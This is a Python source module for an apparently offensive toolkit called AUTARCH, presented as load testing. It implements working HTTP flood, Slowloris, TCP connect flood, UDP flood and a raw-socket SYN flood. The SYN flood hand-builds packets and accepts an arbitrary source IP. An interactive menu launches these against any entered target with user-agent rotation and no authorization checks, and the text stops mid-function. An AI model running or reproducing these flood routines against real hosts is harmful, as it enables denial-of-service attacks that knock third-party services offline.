"""AUTARCH Load Testing Module

Multi-protocol load/stress testing tool combining features from
Apache Bench, Locust, k6, wrk, Slowloris, and HULK.

Supports: HTTP/HTTPS GET/POST/PUT/DELETE, Slowloris, SYN flood,
UDP flood, TCP connect flood, with real-time metrics and ramp-up patterns.
"""

DESCRIPTION = "Load & stress testing toolkit"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "offense"

import time
import threading
import random
import string
import socket
import ssl
import struct
import queue
import json
import statistics
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any
from enum import Enum
from collections import deque
from urllib.parse import urlparse

# Optional: requests for HTTP tests
try:
    import requests
    from requests.adapters import HTTPAdapter
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class AttackType(Enum):
    HTTP_FLOOD = "http_flood"
    HTTP_SLOWLORIS = "slowloris"
    TCP_CONNECT = "tcp_connect"
    UDP_FLOOD = "udp_flood"
    SYN_FLOOD = "syn_flood"


class RampPattern(Enum):
    CONSTANT = "constant"     # All workers at once
    LINEAR = "linear"         # Gradually add workers
    STEP = "step"             # Add workers in bursts
    SPIKE = "spike"           # Burst → sustain → burst


@dataclass
class RequestResult:
    status_code: int = 0
    latency_ms: float = 0.0
    bytes_sent: int = 0
    bytes_received: int = 0
    success: bool = False
    error: str = ""
    timestamp: float = 0.0


@dataclass
class TestMetrics:
    """Live metrics for a running load test."""
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    bytes_sent: int = 0
    bytes_received: int = 0
    start_time: float = 0.0
    elapsed: float = 0.0
    active_workers: int = 0
    status_codes: Dict[int, int] = field(default_factory=dict)
    latencies: List[float] = field(default_factory=list)
    errors: Dict[str, int] = field(default_factory=dict)
    rps_history: List[float] = field(default_factory=list)

    @property
    def rps(self) -> float:
        if self.elapsed <= 0:
            return 0.0
        return self.total_requests / self.elapsed

    @property
    def avg_latency(self) -> float:
        return statistics.mean(self.latencies) if self.latencies else 0.0

    @property
    def p50_latency(self) -> float:
        if not self.latencies:
            return 0.0
        s = sorted(self.latencies)
        return s[len(s) // 2]

    @property
    def p95_latency(self) -> float:
        if not self.latencies:
            return 0.0
        s = sorted(self.latencies)
        return s[int(len(s) * 0.95)]

    @property
    def p99_latency(self) -> float:
        if not self.latencies:
            return 0.0
        s = sorted(self.latencies)
        return s[int(len(s) * 0.99)]

    @property
    def max_latency(self) -> float:
        return max(self.latencies) if self.latencies else 0.0

    @property
    def min_latency(self) -> float:
        return min(self.latencies) if self.latencies else 0.0

    @property
    def success_rate(self) -> float:
        if self.total_requests <= 0:
            return 0.0
        return (self.successful / self.total_requests) * 100

    @property
    def error_rate(self) -> float:
        if self.total_requests <= 0:
            return 0.0
        return (self.failed / self.total_requests) * 100

    def to_dict(self) -> dict:
        return {
            'total_requests': self.total_requests,
            'successful': self.successful,
            'failed': self.failed,
            'bytes_sent': self.bytes_sent,
            'bytes_received': self.bytes_received,
            'elapsed': round(self.elapsed, 2),
            'active_workers': self.active_workers,
            'rps': round(self.rps, 1),
            'avg_latency': round(self.avg_latency, 2),
            'p50_latency': round(self.p50_latency, 2),
            'p95_latency': round(self.p95_latency, 2),
            'p99_latency': round(self.p99_latency, 2),
            'max_latency': round(self.max_latency, 2),
            'min_latency': round(self.min_latency, 2),
            'success_rate': round(self.success_rate, 1),
            'error_rate': round(self.error_rate, 1),
            'status_codes': dict(self.status_codes),
            'top_errors': dict(sorted(self.errors.items(), key=lambda x: -x[1])[:5]),
            'rps_history': list(self.rps_history[-60:]),
        }


# User-agent rotation pool
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "curl/8.4.0",
    "python-requests/2.31.0",
]


class LoadTester:
    """Multi-protocol load testing engine."""

    def __init__(self):
        self._stop_event = threading.Event()
        self._pause_event = threading.Event()
        self._pause_event.set()  # Not paused by default
        self._workers: List[threading.Thread] = []
        self._metrics = TestMetrics()
        self._metrics_lock = threading.Lock()
        self._running = False
        self._config: Dict[str, Any] = {}
        self._result_queue: queue.Queue = queue.Queue()
        self._subscribers: List[queue.Queue] = []
        self._rps_counter = 0
        self._rps_timer_start = 0.0

    @property
    def running(self) -> bool:
        return self._running

    @property
    def metrics(self) -> TestMetrics:
        return self._metrics

    def start(self, config: Dict[str, Any]):
        """Start a load test with given configuration.

        Config keys:
            target: URL or host:port
            attack_type: http_flood|slowloris|tcp_connect|udp_flood|syn_flood
            workers: Number of concurrent workers
            duration: Duration in seconds (0 = unlimited)
            requests_per_worker: Max requests per worker (0 = unlimited)
            ramp_pattern: constant|linear|step|spike
            ramp_duration: Ramp-up time in seconds
            method: HTTP method (GET/POST/PUT/DELETE)
            headers: Custom headers dict
            body: Request body
            timeout: Request timeout in seconds
            follow_redirects: Follow HTTP redirects
            verify_ssl: Verify SSL certificates
            rotate_useragent: Rotate user agents
            custom_useragent: Custom user agent string
            rate_limit: Max requests per second (0 = unlimited)
            payload_size: UDP/TCP payload size in bytes
        """
        if self._running:
            return

        self._stop_event.clear()
        self._pause_event.set()
        self._running = True
        self._config = config
        self._metrics = TestMetrics(start_time=time.time())
        self._rps_counter = 0
        self._rps_timer_start = time.time()

        # Start metrics collector thread
        collector = threading.Thread(target=self._collect_results, daemon=True)
        collector.start()

        # Start RPS tracker
        rps_tracker = threading.Thread(target=self._track_rps, daemon=True)
        rps_tracker.start()

        # Determine attack type
        attack_type = config.get('attack_type', 'http_flood')
        workers = config.get('workers', 10)
        ramp = config.get('ramp_pattern', 'constant')
        ramp_dur = config.get('ramp_duration', 0)

        # Launch workers based on ramp pattern
        launcher = threading.Thread(
            target=self._launch_workers,
            args=(attack_type, workers, ramp, ramp_dur),
            daemon=True
        )
        launcher.start()

    def stop(self):
        """Stop the load test."""
        self._stop_event.set()
        self._running = False

    def pause(self):
        """Pause the load test."""
        self._pause_event.clear()

    def resume(self):
        """Resume the load test."""
        self._pause_event.set()

    def subscribe(self) -> queue.Queue:
        """Subscribe to real-time metric updates."""
        q = queue.Queue()
        self._subscribers.append(q)
        return q

    def unsubscribe(self, q: queue.Queue):
        """Unsubscribe from metric updates."""
        if q in self._subscribers:
            self._subscribers.remove(q)

    def _publish(self, data: dict):
        """Publish data to all subscribers."""
        dead = []
        for q in self._subscribers:
            try:
                q.put_nowait(data)
            except queue.Full:
                dead.append(q)
        for q in dead:
            self._subscribers.remove(q)

    def _launch_workers(self, attack_type: str, total_workers: int,
                        ramp: str, ramp_dur: float):
        """Launch worker threads according to ramp pattern."""
        worker_fn = {
            'http_flood': self._http_worker,
            'slowloris': self._slowloris_worker,
            'tcp_connect': self._tcp_worker,
            'udp_flood': self._udp_worker,
            'syn_flood': self._syn_worker,
        }.get(attack_type, self._http_worker)

        if ramp == 'constant' or ramp_dur <= 0:
            for i in range(total_workers):
                if self._stop_event.is_set():
                    break
                t = threading.Thread(target=worker_fn, args=(i,), daemon=True)
                t.start()
                self._workers.append(t)
                with self._metrics_lock:
                    self._metrics.active_workers = len(self._workers)
        elif ramp == 'linear':
            interval = ramp_dur / max(total_workers, 1)
            for i in range(total_workers):
                if self._stop_event.is_set():
                    break
                t = threading.Thread(target=worker_fn, args=(i,), daemon=True)
                t.start()
                self._workers.append(t)
                with self._metrics_lock:
                    self._metrics.active_workers = len(self._workers)
                time.sleep(interval)
        elif ramp == 'step':
            steps = min(5, total_workers)
            per_step = total_workers // steps
            step_interval = ramp_dur / steps
            for s in range(steps):
                if self._stop_event.is_set():
                    break
                count = per_step if s < steps - 1 else total_workers - len(self._workers)
                for i in range(count):
                    if self._stop_event.is_set():
                        break
                    t = threading.Thread(target=worker_fn, args=(len(self._workers),), daemon=True)
                    t.start()
                    self._workers.append(t)
                with self._metrics_lock:
                    self._metrics.active_workers = len(self._workers)
                time.sleep(step_interval)
        elif ramp == 'spike':
            # Burst 50%, wait, add remaining
            burst = total_workers // 2
            for i in range(burst):
                if self._stop_event.is_set():
                    break
                t = threading.Thread(target=worker_fn, args=(i,), daemon=True)
                t.start()
                self._workers.append(t)
            with self._metrics_lock:
                self._metrics.active_workers = len(self._workers)
            time.sleep(ramp_dur / 2)
            for i in range(burst, total_workers):
                if self._stop_event.is_set():
                    break
                t = threading.Thread(target=worker_fn, args=(i,), daemon=True)
                t.start()
                self._workers.append(t)
            with self._metrics_lock:
                self._metrics.active_workers = len(self._workers)

        # Wait for duration or stop
        duration = self._config.get('duration', 0)
        if duration > 0:
            start = time.time()
            while time.time() - start < duration and not self._stop_event.is_set():
                time.sleep(0.5)
            self.stop()

    def _collect_results(self):
        """Collect results from worker threads."""
        while self._running or not self._result_queue.empty():
            try:
                result = self._result_queue.get(timeout=0.5)
            except queue.Empty:
                continue

            with self._metrics_lock:
                m = self._metrics
                m.total_requests += 1
                m.elapsed = time.time() - m.start_time
                m.bytes_sent += result.bytes_sent
                m.bytes_received += result.bytes_received

                if result.success:
                    m.successful += 1
                else:
                    m.failed += 1
                    err_key = result.error[:50] if result.error else 'unknown'
                    m.errors[err_key] = m.errors.get(err_key, 0) + 1

                if result.status_code:
                    m.status_codes[result.status_code] = m.status_codes.get(result.status_code, 0) + 1

                if result.latency_ms > 0:
                    # Keep last 10000 latencies for percentile calculation
                    if len(m.latencies) > 10000:
                        m.latencies = m.latencies[-5000:]
                    m.latencies.append(result.latency_ms)

                self._rps_counter += 1

            # Publish update every 20 requests
            if m.total_requests % 20 == 0:
                self._publish({'type': 'metrics', 'data': m.to_dict()})

    def _track_rps(self):
        """Track requests per second over time."""
        while self._running:
            time.sleep(1)
            with self._metrics_lock:
                now = time.time()
                elapsed = now - self._rps_timer_start
                if elapsed >= 1.0:
                    current_rps = self._rps_counter / elapsed
                    self._metrics.rps_history.append(round(current_rps, 1))
                    if len(self._metrics.rps_history) > 120:
                        self._metrics.rps_history = self._metrics.rps_history[-60:]
                    self._rps_counter = 0
                    self._rps_timer_start = now

    def _should_continue(self, request_count: int) -> bool:
        """Check if worker should continue."""
        if self._stop_event.is_set():
            return False
        max_req = self._config.get('requests_per_worker', 0)
        if max_req > 0 and request_count >= max_req:
            return False
        return True

    def _rate_limit_wait(self):
        """Apply rate limiting if configured."""
        rate = self._config.get('rate_limit', 0)
        if rate > 0:
            workers = self._config.get('workers', 1)
            per_worker = rate / max(workers, 1)
            if per_worker > 0:
                time.sleep(1.0 / per_worker)

    def _get_session(self) -> 'requests.Session':
        """Create an HTTP session with configuration."""
        if not REQUESTS_AVAILABLE:
            raise RuntimeError("requests library not available")

        session = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=10,
            pool_maxsize=10,
            max_retries=0,
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.verify = self._config.get('verify_ssl', False)

        # Custom headers
        headers = self._config.get('headers', {})
        if headers:
            session.headers.update(headers)

        if self._config.get('rotate_useragent', True):
            session.headers['User-Agent'] = random.choice(USER_AGENTS)
        elif self._config.get('custom_useragent'):
            session.headers['User-Agent'] = self._config['custom_useragent']

        return session

    def _http_worker(self, worker_id: int):
        """HTTP flood worker — sends rapid HTTP requests."""
        target = self._config.get('target', '')
        method = self._config.get('method', 'GET').upper()
        body = self._config.get('body', '')
        timeout = self._config.get('timeout', 10)
        follow = self._config.get('follow_redirects', True)
        count = 0

        session = self._get_session()

        while self._should_continue(count):
            self._pause_event.wait()
            self._rate_limit_wait()

            if self._config.get('rotate_useragent', True):
                session.headers['User-Agent'] = random.choice(USER_AGENTS)

            start = time.time()
            result = RequestResult(timestamp=start)

            try:
                resp = session.request(
                    method, target,
                    data=body if body else None,
                    timeout=timeout,
                    allow_redirects=follow,
                )
                elapsed = (time.time() - start) * 1000

                result.status_code = resp.status_code
                result.latency_ms = elapsed
                result.bytes_received = len(resp.content)
                result.bytes_sent = len(body.encode()) if body else 0
                result.success = 200 <= resp.status_code < 500

            except requests.Timeout:
                result.error = "timeout"
                result.latency_ms = timeout * 1000
            except requests.ConnectionError as e:
                result.error = f"connection_error: {str(e)[:60]}"
            except Exception as e:
                result.error = str(e)[:80]

            self._result_queue.put(result)
            count += 1

        session.close()

    def _slowloris_worker(self, worker_id: int):
        """Slowloris worker — holds connections open with partial headers."""
        parsed = urlparse(self._config.get('target', ''))
        host = parsed.hostname or self._config.get('target', '')
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        timeout = self._config.get('timeout', 10)

        sockets: List[socket.socket] = []
        max_sockets = 50  # Per worker

        while self._should_continue(0):
            self._pause_event.wait()

            # Create new sockets up to limit
            while len(sockets) < max_sockets and not self._stop_event.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    if use_ssl:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        sock = ctx.wrap_socket(sock, server_hostname=host)
                    sock.connect((host, port))

                    # Send partial HTTP request
                    ua = random.choice(USER_AGENTS)
                    sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {host}\r\n".encode())
                    sock.send(f"User-Agent: {ua}\r\n".encode())
                    sock.send(b"Accept-language: en-US,en;q=0.5\r\n")

                    sockets.append(sock)
                    result = RequestResult(
                        success=True, timestamp=time.time(),
                        bytes_sent=200, latency_ms=0
                    )
                    self._result_queue.put(result)
                except Exception as e:
                    result = RequestResult(
                        error=str(e)[:60], timestamp=time.time()
                    )
                    self._result_queue.put(result)
                    break

            # Keep connections alive with partial headers
            dead = []
            for i, sock in enumerate(sockets):
                try:
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    sock.send(header.encode())
                except Exception:
                    dead.append(i)

            # Remove dead sockets
            for i in sorted(dead, reverse=True):
                try:
                    sockets[i].close()
                except Exception:
                    pass
                sockets.pop(i)

            time.sleep(random.uniform(5, 15))

        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except Exception:
                pass

    def _tcp_worker(self, worker_id: int):
        """TCP connect flood worker — rapid connect/disconnect."""
        parsed = urlparse(self._config.get('target', ''))
        host = parsed.hostname or self._config.get('target', '').split(':')[0]
        try:
            port = parsed.port or int(self._config.get('target', '').split(':')[-1])
        except (ValueError, IndexError):
            port = 80
        timeout = self._config.get('timeout', 5)
        payload_size = self._config.get('payload_size', 0)
        count = 0

        while self._should_continue(count):
            self._pause_event.wait()
            self._rate_limit_wait()

            start = time.time()
            result = RequestResult(timestamp=start)

            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((host, port))

                if payload_size > 0:
                    data = random.randbytes(payload_size)
                    sock.send(data)
                    result.bytes_sent = payload_size

                elapsed = (time.time() - start) * 1000
                result.latency_ms = elapsed
                result.success = True

                sock.close()
            except socket.timeout:
                result.error = "timeout"
                result.latency_ms = timeout * 1000
            except ConnectionRefusedError:
                result.error = "connection_refused"
            except Exception as e:
                result.error = str(e)[:60]

            self._result_queue.put(result)
            count += 1

    def _udp_worker(self, worker_id: int):
        """UDP flood worker — sends UDP packets."""
        target = self._config.get('target', '')
        host = target.split(':')[0] if ':' in target else target
        try:
            port = int(target.split(':')[1]) if ':' in target else 80
        except (ValueError, IndexError):
            port = 80
        payload_size = self._config.get('payload_size', 1024)
        count = 0

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while self._should_continue(count):
            self._pause_event.wait()
            self._rate_limit_wait()

            start = time.time()
            result = RequestResult(timestamp=start)

            try:
                data = random.randbytes(payload_size)
                sock.sendto(data, (host, port))
                elapsed = (time.time() - start) * 1000
                result.latency_ms = elapsed
                result.bytes_sent = payload_size
                result.success = True
            except Exception as e:
                result.error = str(e)[:60]

            self._result_queue.put(result)
            count += 1

        sock.close()

    @staticmethod
    def _checksum(data: bytes) -> int:
        """Calculate IP/TCP checksum."""
        if len(data) % 2:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) + data[i + 1]
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def _build_syn_packet(self, src_ip: str, dst_ip: str,
                          src_port: int, dst_port: int) -> bytes:
        """Build a raw TCP SYN packet (IP header + TCP header)."""
        # IP Header (20 bytes)
        ip_ihl_ver = (4 << 4) + 5  # IPv4, IHL=5 (20 bytes)
        ip_tos = 0
        ip_tot_len = 40  # 20 IP + 20 TCP
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)

        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        # Recalculate IP checksum
        ip_check = self._checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)

        # TCP Header (20 bytes)
        tcp_seq = random.randint(0, 0xFFFFFFFF)
        tcp_ack_seq = 0
        tcp_doff = 5  # Data offset: 5 words (20 bytes)
        tcp_flags = 0x02  # SYN
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        tcp_offset_res = (tcp_doff << 4) + 0

        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port, dst_port, tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags, tcp_window,
                                 tcp_check, tcp_urg_ptr)

        # Pseudo header for TCP checksum
        pseudo = struct.pack('!4s4sBBH',
                             ip_saddr, ip_daddr, 0, ip_proto, 20)
        tcp_check = self._checksum(pseudo + tcp_header)
        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port, dst_port, tcp_seq, tcp_ack_seq,
                                 tcp_offset_res, tcp_flags, tcp_window,
                                 tcp_check, tcp_urg_ptr)

        return ip_header + tcp_header

    def _syn_worker(self, worker_id: int):
        """SYN flood worker — sends raw TCP SYN packets.

        Requires elevated privileges (admin/root) for raw sockets.
        Falls back to TCP connect flood if raw socket creation fails.
        """
        target = self._config.get('target', '')
        host = target.split(':')[0] if ':' in target else target
        try:
            port = int(target.split(':')[1]) if ':' in target else 80
        except (ValueError, IndexError):
            port = 80

        # Resolve target IP
        try:
            dst_ip = socket.gethostbyname(host)
        except socket.gaierror:
            result = RequestResult(error=f"Cannot resolve {host}", timestamp=time.time())
            self._result_queue.put(result)
            return

        # Source IP: user-specified or auto-detect local IP
        src_ip = self._config.get('source_ip', '').strip()
        if not src_ip:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((dst_ip, 80))
                src_ip = s.getsockname()[0]
                s.close()
            except Exception:
                src_ip = '127.0.0.1'

        # Try to create raw socket
        try:
            import sys
            if sys.platform == 'win32':
                # Windows raw sockets
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            # Fall back to TCP connect flood
            self._tcp_worker(worker_id)
            return
        except OSError as e:
            result = RequestResult(
                error=f"Raw socket failed (need admin/root): {e}", timestamp=time.time()
            )
            self._result_queue.put(result)
            # Fall back
            self._tcp_worker(worker_id)
            return

        count = 0
        while self._should_continue(count):
            self._pause_event.wait()
            self._rate_limit_wait()

            start = time.time()
            result = RequestResult(timestamp=start)

            try:
                src_port = random.randint(1024, 65535)
                packet = self._build_syn_packet(src_ip, dst_ip, src_port, port)
                sock.sendto(packet, (dst_ip, 0))

                elapsed = (time.time() - start) * 1000
                result.latency_ms = elapsed
                result.bytes_sent = len(packet)
                result.success = True
            except Exception as e:
                result.error = str(e)[:60]

            self._result_queue.put(result)
            count += 1

        sock.close()


# Singleton
_load_tester: Optional[LoadTester] = None


def get_load_tester() -> LoadTester:
    global _load_tester
    if _load_tester is None:
        _load_tester = LoadTester()
    return _load_tester


def _clear():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')


def _format_bytes(b: int) -> str:
    if b < 1024:
        return f"{b} B"
    elif b < 1024 * 1024:
        return f"{b / 1024:.1f} KB"
    elif b < 1024 * 1024 * 1024:
        return f"{b / (1024 * 1024):.1f} MB"
    return f"{b / (1024 * 1024 * 1024):.2f} GB"


def run():
    """Interactive CLI for the load testing module."""
    from core.banner import Colors

    tester = get_load_tester()

    while True:
        _clear()
        print(f"\n{Colors.RED}  ╔══════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.RED}  ║       AUTARCH Load Tester            ║{Colors.RESET}")
        print(f"{Colors.RED}  ╚══════════════════════════════════════╝{Colors.RESET}")
        print()

        if tester.running:
            m = tester.metrics
            print(f"  {Colors.GREEN}● TEST RUNNING{Colors.RESET}  Workers: {m.active_workers}  Elapsed: {m.elapsed:.0f}s")
            print(f"  {Colors.CYAN}RPS: {m.rps:.1f}  Total: {m.total_requests}  OK: {m.successful}  Fail: {m.failed}{Colors.RESET}")
            print(f"  {Colors.DIM}Avg: {m.avg_latency:.1f}ms  P95: {m.p95_latency:.1f}ms  P99: {m.p99_latency:.1f}ms{Colors.RESET}")
            print(f"  {Colors.DIM}Sent: {_format_bytes(m.bytes_sent)}  Recv: {_format_bytes(m.bytes_received)}{Colors.RESET}")
            print()
            print(f"  {Colors.WHITE}1{Colors.RESET} — View live metrics")
            print(f"  {Colors.WHITE}2{Colors.RESET} — Pause / Resume")
            print(f"  {Colors.WHITE}3{Colors.RESET} — Stop test")
            print(f"  {Colors.WHITE}0{Colors.RESET} — Back (test continues)")
        else:
            print(f"  {Colors.WHITE}1{Colors.RESET} — HTTP Flood")
            print(f"  {Colors.WHITE}2{Colors.RESET} — Slowloris")
            print(f"  {Colors.WHITE}3{Colors.RESET} — TCP Connect Flood")
            print(f"  {Colors.WHITE}4{Colors.RESET} — UDP Flood")
            print(f"  {Colors.WHITE}5{Colors.RESET} — SYN Flood (requires admin)")
            print(f"  {Colors.WHITE}6{Colors.RESET} — Quick Test (HTTP GET)")
            print(f"  {Colors.WHITE}0{Colors.RESET} — Back")

        print()
        try:
            choice = input(f"  {Colors.WHITE}Select: {Colors.RESET}").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if choice == '0' or not choice:
            break

        if tester.running:
            if choice == '1':
                _show_live_metrics(tester)
            elif choice == '2':
                if tester._pause_event.is_set():
                    tester.pause()
                    print(f"\n  {Colors.YELLOW}[!] Test paused{Colors.RESET}")
                else:
                    tester.resume()
                    print(f"\n  {Colors.GREEN}[+] Test resumed{Colors.RESET}")
                time.sleep(1)
            elif choice == '3':
                tester.stop()
                _show_final_report(tester)
        else:
            if choice == '1':
                _configure_and_run(tester, 'http_flood')
            elif choice == '2':
                _configure_and_run(tester, 'slowloris')
            elif choice == '3':
                _configure_and_run(tester, 'tcp_connect')
            elif choice == '4':
                _configure_and_run(tester, 'udp_flood')
            elif choice == '5':
                _configure_and_run(tester, 'syn_flood')
            elif choice == '6':
                _quick_test(tester)


def _configure_and_run(tester: LoadTester, attack_type: str):
    """Interactive configuration and launch."""
    from core.banner import Colors

    print(f"\n{Colors.BOLD}  Configure {attack_type.replace('_', ' ').title()}{Colors.RESET}")
    print(f"{Colors.DIM}  {'─' * 40}{Colors.RESET}\n")

    src_ip = ''
    try:
        if attack_type == 'http_flood':
            target = input(f"  Target URL: ").strip()
            if not target:
                return
            if not target.startswith('http'):
                target = 'http://' + target
            method = input(f"  Method [GET]: ").strip().upper() or 'GET'
            body = ''
            if method in ('POST', 'PUT'):
                body = input(f"  Body: ").strip()
        elif attack_type == 'syn_flood':
            print(f"  {Colors.YELLOW}[!] SYN flood requires administrator/root privileges{Colors.RESET}")
            target = input(f"  Target (host:port): ").strip()
            if not target:
                return
            src_ip = input(f"  Source IP (blank=auto): ").strip()
            method = ''
            body = ''
        elif attack_type in ('tcp_connect', 'udp_flood'):
            target = input(f"  Target (host:port): ").strip()
            if not target:
                return
            method = ''
            body = ''
        elif attack_type == 'slowloris':
            target = input(f"  Target URL or host:port: ").strip()
            if not target:
                return
            if not target.startswith('http') and ':' not in target:
                target = 'http://' + target
            method = ''
            body = ''
        else:
            target = input(f"  Target: ").strip()
            if not target:
                return
            method = ''
            body = ''

        workers_s = input(f"  Workers [10]: ").strip()
        workers = int(workers_s) if workers_s else 10

        duration_s = input(f"  Duration in seconds [30]: ").strip()
        duration = int(duration_s) if duration_s else 30

        ramp_s = input(f"  Ramp pattern (constant/linear/step/spike) [constant]: ").strip()
        ramp = ramp_s if ramp_s in ('constant', 'linear', 'step', 'spike') else 'constant'

        rate_s = input(f"  Rate limit (req/s, 0=unlimited) [0]: ").strip()
        rate_limit = int(rate_s) if rate_s else 0

        config = {
            'target': target,
            'attack_type': attack_type,
            'workers': workers,
            'duration': duration,
            'method': method,
            'body': body,
            'ramp_pattern': ramp,
            'rate_limit': rate_limit,
            'timeout': 10,
            'rotate_useragent': True,
            'verify_ssl': False,
            'follow_redirects': True,
            'payload_size': 1024,
            'source_ip': src_ip if attack_type == 'syn_flood' else '',
        }

        print(f"\n  {Colors.YELLOW}[!] Starting {attack_type} against {target}{Colors.RESET}")
        print(f"  {Colors.DIM}Workers: {workers}  Duration: {duration}s  Ramp: {ramp}{Colors.RESET}")
        confirm = input(f"\n  {Colors.WHITE}Confirm? (y/n) [y]: {Colors.RESET}").strip().lower()
        if confirm == 'n':
            return

        tester.start(config)
        _show_live_metrics(tester)

    except (ValueError, EOFError, KeyboardInterrupt):
        print(f"\n  {Colors.YELLOW}[!] Cancelled{Colors.RESET}")
        time.sleep(1)


def _quick_test(tester: LoadTester):
    """Quick HTTP GET test with defaults."""
    from core.banner import Colors

    try:
        target = input(f"\n  Target URL: ").strip()
        if not target:
            return
        if not target.startswith('http'):
            target = 'http://' + target

        config = {
            'target': target,
            'attack_type': 'http_flood',
            'workers': 10,
            'duration': 10,
            'method': 'GET',
            'body': '',
            'ramp_pattern': 'constant',
            'rate_limit': 0,
            'timeout': 10,
            'rotate_useragent': True,
            'verify_ssl': False,
            'follow_redirects': True,
        }

        print(f"\n  {Colors.YELLOW}[!] Quick test: 10 workers × 10 seconds → {target}{Colors.RESET}")
        tester.start(config)
        _show_live_metrics(tester)

    except (EOFError, KeyboardInterrupt):
        pass


def _show_live_metrics(tester: LoadTester):
    """Display live-updating metrics in the terminal."""
    from core.banner import Colors
    import sys

    print(f"\n  {Colors.GREEN}● LIVE METRICS  {Colors.DIM}(Press Ctrl+C to return to menu){Colors.RESET}\n")

    try:
        while tester.running:
            m = tester.metrics
            rps_bar = '█' * min(int(m.rps / 10), 40)

            sys.stdout.write('\033[2K\r')  # Clear line
            sys.stdout.write(
                f"  {Colors.CYAN}RPS: {m.rps:>7.1f}{Colors.RESET} "
                f"{Colors.DIM}{rps_bar}{Colors.RESET}  "
                f"Total: {m.total_requests:>8}  "
                f"{Colors.GREEN}OK: {m.successful}{Colors.RESET}  "
                f"{Colors.RED}Fail: {m.failed}{Colors.RESET}  "
                f"Avg: {m.avg_latency:.0f}ms  "
                f"P95: {m.p95_latency:.0f}ms  "
                f"Workers: {m.active_workers}"
            )
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass

    print()
    if not tester.running:
        _show_final_report(tester)


def _show_final_report(tester: LoadTester):
    """Display final test results."""
    from core.banner import Colors

    m = tester.metrics
    print(f"\n{Colors.BOLD}  ─── Test Complete ───{Colors.RESET}\n")
    print(f"  Total Requests:  {m.total_requests}")
    print(f"  Successful:      {Colors.GREEN}{m.successful}{Colors.RESET}")
    print(f"  Failed:          {Colors.RED}{m.failed}{Colors.RESET}")
    print(f"  Duration:        {m.elapsed:.1f}s")
    print(f"  Avg RPS:         {m.rps:.1f}")
    print(f"  Data Sent:       {_format_bytes(m.bytes_sent)}")
    print(f"  Data Received:   {_format_bytes(m.bytes_received)}")
    print()
    print(f"  {Colors.CYAN}Latency:{Colors.RESET}")
    print(f"    Min:   {m.min_latency:.1f}ms")
    print(f"    Avg:   {m.avg_latency:.1f}ms")
    print(f"    P50:   {m.p50_latency:.1f}ms")
    print(f"    P95:   {m.p95_latency:.1f}ms")
    print(f"    P99:   {m.p99_latency:.1f}ms")
    print(f"    Max:   {m.max_latency:.1f}ms")

    if m.status_codes:
        print(f"\n  {Colors.CYAN}Status Codes:{Colors.RESET}")
        for code, count in sorted(m.status_codes.items()):
            color = Colors.GREEN if 200 <= code < 300 else Colors.YELLOW if 300 <= code < 400 else Colors.RED
            print(f"    {color}{code}{Colors.RESET}: {count}")

    if m.errors:
        print(f"\n  {Colors.RED}Top Errors:{Colors.RESET}")
        for err, count in sorted(m.errors.items(), key=lambda x: -x[1])[:5]:
            print(f"    {count}× {err}")

    print()
    try:
        input(f"  {Colors.WHITE}Press Enter to continue...{Colors.RESET}")
